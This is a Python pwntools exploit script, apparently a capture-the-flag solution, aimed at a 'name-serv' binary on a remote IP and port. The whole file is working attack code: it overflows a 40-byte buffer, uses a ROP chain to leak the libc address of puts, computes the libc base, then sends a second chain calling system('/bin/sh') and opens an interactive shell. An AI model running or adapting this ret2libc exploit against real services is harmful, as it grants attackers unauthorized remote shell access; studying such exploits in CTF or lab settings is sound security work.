#!/usr/bin/env python
from pwn import * 

p = remote("3.97.113.25", 9001) 
#p = process("./name-serv") 
elf = ELF("./name-serv")
libc = ELF("libc.so.6")
rop = ROP(elf)

puts_plt = elf.plt['puts']
main = elf.symbols['main']
puts_got = elf.got['puts']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

log.info("Puts@plt: " + hex(puts_plt))
log.info("Puts@glt : " + hex(puts_got))
log.info("Pop rdi gadget: " + hex(pop_rdi))
log.info("rdi: " + hex(ret))

offset = ("A"*40).encode()

payload1 = offset 
payload1 += p64(pop_rdi) 
payload1 += p64(puts_got) 
payload1 += p64(puts_plt) 
payload1 += p64(main)

p.recvuntil("what is you name: ")

p.sendline(payload1)

recieved = p.recvline().strip()
leak =  u64(recieved.ljust(8,b"\x00"))
log.info("Leaked libc address, Puts: %s" % hex(leak))

libc.address = leak - libc.sym["puts"]
log.info("Base address of libc: %s " % hex(libc.address))

bin_sh = next(libc.search("/bin/sh")) 
system = libc.sym["system"]

log.info("bin/sh: %s " % hex(bin_sh))
log.info("system: %s " % hex(system))

payload2 = offset 
payload2 += p64(ret) 
payload2 += p64(pop_rdi) 
payload2 += p64(bin_sh) 
payload2 += p64(system)

p.recvuntil("what is you name: ")

p.sendline(payload2)

p.interactive()
